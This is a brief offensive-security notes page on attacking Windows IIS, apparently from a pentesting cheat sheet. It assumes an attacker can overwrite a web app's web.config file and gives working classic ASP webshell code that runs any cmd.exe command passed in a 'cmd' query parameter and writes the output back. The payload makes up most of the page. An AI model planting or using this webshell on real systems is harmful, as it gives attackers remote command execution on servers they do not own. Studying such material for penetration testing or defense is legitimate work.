# Windows IIS

## Short Filename

## web.config

In this exploit we take the assumption that we have file write into a web-app and are able to overwrite the web.config file.  The article [Upload a web.config File for Fun and Profit](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) shows us a few we can upload to achieve various objectives.  

We can achieve a simple webshell with the follow classic ASP code:

```asp
set cmd = Request.QueryString("cmd")
Set os = Server.CreateObject("WSCRIPT.SHELL")
output = os.exec("cmd.exe /c " + cmd).stdout.readall
response.write output
```

